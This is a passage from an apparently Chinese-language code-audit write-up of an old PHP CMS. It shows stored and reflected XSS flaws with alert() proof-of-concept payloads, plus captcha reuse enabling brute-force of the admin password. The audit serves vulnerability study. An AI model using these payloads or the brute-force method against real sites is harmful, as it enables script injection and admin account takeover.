<span class="cp">?&gt;</span><span class="x"> </span>
<span class="x">&lt;div class="stui-pannel stui-pannel-bg clearfix"&gt;&lt;div class="stui-pannel-box clearfix"&gt;&lt;div class="col-pd clearfix"&gt;&lt;ul&gt;&lt;li class="topwords"&gt;&lt;strong&gt;&lt;u&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;/u&gt; 说：&lt;/strong&gt;&lt;/li&gt;&lt;li class="top-line" style="margin-top: 10px; padding: 10px 0;"&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&lt;br/&gt;&lt;font color=red&gt;&lt;/font&gt;</span>
<span class="x">&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;hr&gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&lt;ul class="stui-page text-center"&gt;&lt;div style='margin:50px auto;text-align:center'&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">page_show</span><span class="p">(</span><span class="nv">$pager</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="nv">$pager</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="nv">$pager</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mi">2</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>对传入的$_POST['content']变量经过null_back()、addslashes()等方法进行处理，又引入转义文件转义处理，同样的情况我们在之前的<strong><em>/youlian.php  存储型xss</em></strong>部分已经提到过，即经过一系列处理，该变量实际上进行了一次我称之为“<strong>负负得正</strong>”的转义操作，相当于没有防范，又和后端数据库进行了交互，所以此处就形成了一个存储型xss,访问该文件，构造闭合，形成payload进行攻击尝试：</p>
<div class="highlight"><pre><span></span><span class="x">&lt;/li&gt;&lt;script&gt;alert(/wowo/)&lt;/script&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162309-ed9b23ea-cdde-1.png"/></p>
<p>再想，这里是留言板，那么后台应该也会引用这里的留言内容，方便管理员进行管理，因此查找到后台对应文件：</p>
<h5 data-content="1" id="4c637277af495438e2046f5973eebfd2">/admin/cms_book.php 存储型xss</h5>
<p>访问，果然弹窗。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162316-f201ab84-cdde-1.png"/></p>
<p>具体代码：</p>
<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="n">include</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="n">include</span><span class="p">(</span><span class="s1">'cms_check.php'</span><span class="p">);</span>
<span class="n">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="n">include</span><span class="p">(</span><span class="s1">'model/book.php'</span><span class="p">);</span>
<span class="err">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">include</span><span class="p">(</span><span class="s1">'inc_header.php'</span><span class="p">)</span> <span class="err">?</span><span class="o">&gt;</span>
<span class="err">。。。。</span>
<span class="err">。。。。</span>
<span class="err">。。。。</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s1">'select * from xtcms_book order by id desc'</span><span class="p">;</span>
<span class="err">$</span><span class="n">pager</span> <span class="o">=</span> <span class="n">page_handle</span><span class="p">(</span><span class="s1">'page'</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="n">mysql_num_rows</span><span class="p">(</span><span class="n">mysql_query</span><span class="p">(</span><span class="err">$</span><span class="n">sql</span><span class="p">)));</span>
<span class="err">$</span><span class="n">result</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="p">(</span><span class="err">$</span><span class="n">sql</span><span class="o">.</span><span class="s1">' limit '</span><span class="o">.</span><span class="err">$</span><span class="n">pager</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">','</span><span class="o">.</span><span class="err">$</span><span class="n">pager</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">''</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="err">$</span><span class="n">row</span><span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="p">(</span><span class="err">$</span><span class="n">result</span><span class="p">)){</span>
<span class="err">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">tr</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"checkbox-custom checkbox-default"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"checkbox"</span> <span class="n">name</span><span class="o">=</span><span class="s2">"id[]"</span> <span class="n">value</span><span class="o">=</span><span class="s2">"&lt;?php echo $row['id'] ?&gt;"</span> <span class="o">/&gt;</span>                      <span class="o">&lt;</span><span class="n">label</span> <span class="k">for</span><span class="o">=</span><span class="s2">"checkboxExample2"</span><span class="o">&gt;&lt;/</span><span class="n">label</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]</span> <span class="err">?</span><span class="o">&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="err">?</span><span class="o">&gt;&lt;/</span><span class="n">td</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">td</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="err">?</span><span class="o">&gt;</span>

                                <span class="o">&lt;</span><span class="n">td</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">class</span><span class="o">=</span><span class="s2">"btn btn-danger"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"cms_book_edit.php?id=&lt;?php echo $row['id']?&gt;"</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"page_show"</span><span class="o">&gt;&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">echo</span> <span class="n">page_show</span><span class="p">(</span><span class="err">$</span><span class="n">pager</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="err">$</span><span class="n">pager</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="err">$</span><span class="n">pager</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="mi">2</span><span class="p">);</span><span class="err">?</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>      
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">include</span><span class="p">(</span><span class="s1">'inc_footer.php'</span><span class="p">)</span> <span class="err">?</span><span class="o">&gt;</span>
</pre></div>
<p>逻辑就是将之前存在数据库中的留言直接取出，引入对xss无用的转移文件处理，检查登录状态，之后直接将取出的数据输出，这就复合上面的分析，形成了一个存储型的前台后台通吃的xss漏洞。</p>
<h5 data-content="1" id="406727f7b7bb0641cff08d861b0498d1">/wx_api.php 反射性xss</h5>
<div class="highlight"><pre><span></span><span class="x">public function valid()</span>
<span class="x">    {</span>
<span class="x">        $echoStr = $_GET["echostr"];</span>
<span class="x">        if($this-&gt;checkSignature()){</span>
<span class="x">            echo $echoStr;</span>
<span class="x">            exit;</span>
<span class="x">   }</span>
</pre></div>
<p>接收$_GET["echostr"]变量，经checkSignature()方法处理后，直接输出,而checkSignature()方法</p>
<div class="highlight"><pre><span></span><span class="x">private function checkSignature()</span>
<span class="x">    {</span>
<span class="x">        // you must define TOKEN by yourself</span>
<span class="x">        if (!defined("TOKEN")) {</span>
<span class="x">            throw new Exception('TOKEN is not defined!');</span>
<span class="x">        }</span>

<span class="x">        $signature = $_GET["signature"];</span>
<span class="x">        $timestamp = $_GET["timestamp"];</span>
<span class="x">        $nonce = $_GET["nonce"];</span>

<span class="x">        $token = TOKEN;</span>
<span class="x">        $tmpArr = array($token, $timestamp, $nonce);</span>
<span class="x">        // use SORT_STRING rule</span>
<span class="x">        sort($tmpArr, SORT_STRING);</span>
<span class="x">        $tmpStr = implode( $tmpArr );</span>
<span class="x">        $tmpStr = sha1( $tmpStr );</span>

<span class="x">        if( $tmpStr == $signature ){</span>
<span class="x">            return true;</span>
<span class="x">        }else{</span>
<span class="x">            return false;</span>
<span class="x">        }</span>
<span class="x">    }</span>
</pre></div>
<p>其中并没有对变量的具体内容的过滤，因此这就是一个简单的反射型xss:</p>
<p>payload: 成功弹窗</p>
<div class="highlight"><pre><span></span><span class="x">?echostr=&lt;script&gt;alert(/wowowo/)&lt;/script&gt;&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</span>
</pre></div>
<p>xss找了这么多，很多都是在重复造轮子（这个cms版本很老），没意思，找找别的漏洞看看：</p>
<h4 data-content="1" id="504fb3964c7bd9e7b36529ab5f7a84f5">验证码重用</h4>
<h5 data-content="1" id="ae78e116dcf3fec08c5e1e7cd71bfe84">/admin/cms_login.php</h5>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'../system/inc.php'</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'submit'</span><span class="p">])){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'verifycode'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'verifycode'</span><span class="p">])</span> <span class="p">{</span>
        <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'验证码错误'</span><span class="p">,</span><span class="s1">'cms_login.php'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a_name'</span><span class="p">],</span><span class="s1">'请输入用户名'</span><span class="p">);</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a_password'</span><span class="p">],</span><span class="s1">'请输入密码'</span><span class="p">);</span>
    <span class="nx">null_back</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'verifycode'</span><span class="p">],</span><span class="s1">'请输入验证码'</span><span class="p">);</span>
    <span class="nv">$a_name</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a_name'</span><span class="p">];</span>
    <span class="nv">$a_password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a_password'</span><span class="p">];</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'select * from xtcms_manager where m_name = "'</span><span class="o">.</span><span class="nv">$a_name</span><span class="o">.</span><span class="s1">'" and m_password = "'</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$a_password</span><span class="p">)</span><span class="o">.</span><span class="s1">'"'</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!!</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'admin_name'</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'m_name'</span><span class="p">]);</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'admin_password'</span><span class="p">,</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'m_password'</span><span class="p">]);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'location:cms_welcome.php'</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nx">alert_href</span><span class="p">(</span><span class="s1">'用户名或密码错误'</span><span class="p">,</span><span class="s1">'cms_login.php'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>在登陆界面检验session和传入的verifycode是否相等，如果访问失败，就会会进行刷新跳转，然后重新执行一次JS代码，</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162341-00e38eec-cddf-1.png"/></p>
<p>搜索关键词，看看这个js是干嘛的，在<strong>../system/verifycode.php</strong>文件中，发现</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$image</span> <span class="o">=</span> <span class="nb">imagecreate</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">34</span><span class="p">);</span>
<span class="nv">$bcolor</span> <span class="o">=</span> <span class="nb">imagecolorallocate</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="nv">$fcolor</span> <span class="o">=</span> <span class="nb">imagecolorallocate</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
<span class="nv">$str</span> <span class="o">=</span> <span class="s1">'0123456789'</span><span class="p">;</span>
<span class="nv">$rand_str</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$k</span> <span class="o">=</span> <span class="nb">mt_rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
    <span class="nv">$rand_str</span> <span class="o">.=</span> <span class="nv">$str</span><span class="p">[</span><span class="nv">$k</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'verifycode'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$rand_str</span><span class="p">;</span>
<span class="nb">imagefill</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$bcolor</span><span class="p">);</span>
<span class="nb">imagestring</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="nv">$rand_str</span><span class="p">,</span> <span class="nv">$fcolor</span><span class="p">);</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'content-type:image/png'</span><span class="p">);</span>
<span class="nb">imagepng</span><span class="p">(</span><span class="nv">$image</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>js引用该文件生成四位随机数作为验证码，这里有一点就是：<strong><em>burp默认不解析js</em></strong>，而文件中也没有时间限制，那么我们就可以用burp抓包，摒除js，重用该验证码对后台密码进行爆破，实现一下：</p>
<p>添加爆破位置</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162353-079f070c-cddf-1.png"/></p>
<p>我这里为了演示效果，因此字典里我就随便写几个密码，把正确密码放进去，进行爆破演示</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20220507162407-106f706a-cddf-1.png"/></p>
<p>可以看到，成功爆破出后台密码123456.</p>
<h4 data-content="1" id="d5c22e8d5bd2b688b7cdbddd4b37d54c">上传漏洞</h4>
<p>到这里，我能找到的关于这个cms的漏洞就结束了，另外，在网上看到师傅们还发现有一个上传漏洞，分析我就不献丑了，链接给出来，大家可以参考一下</p>
<p><a href="https://blog.csdn.net/qq_44713013/article/details/122187203?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2" target="_blank">https://blog.csdn.net/qq_44713013/article/details/122187203?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=2</a></p>
<h4 data-content="1" id="977b5edf2a783510c5a368c9989943b0">最后回顾</h4>
<ol>
<li>这次这个cms代码审计，整体比第一次要熟悉了不少，审出了一些sql和存储xss漏洞，还是不错的。但是同时，也暴露了很多问题，比如php代码功底不够，对很多函数一知半解，甚至完全没有认识，这就导致不停的查查查，效率狂降，心态爆炸。</li>
<li>另外，这次审计中还留下了两个问题有待研究，去好好学习一下，之后有机会一定还要再来回顾这个cms的审计，期待可以发现更多的问题。</li>
<li>还有，有一点想法，程序员在写代码结构的时候一定要注意统观全局，否则就容易出现这个cms中“<strong>负负得正</strong>”逻辑错误，导致防护到最后白干一场。</li>
</ol>
</div>
</div>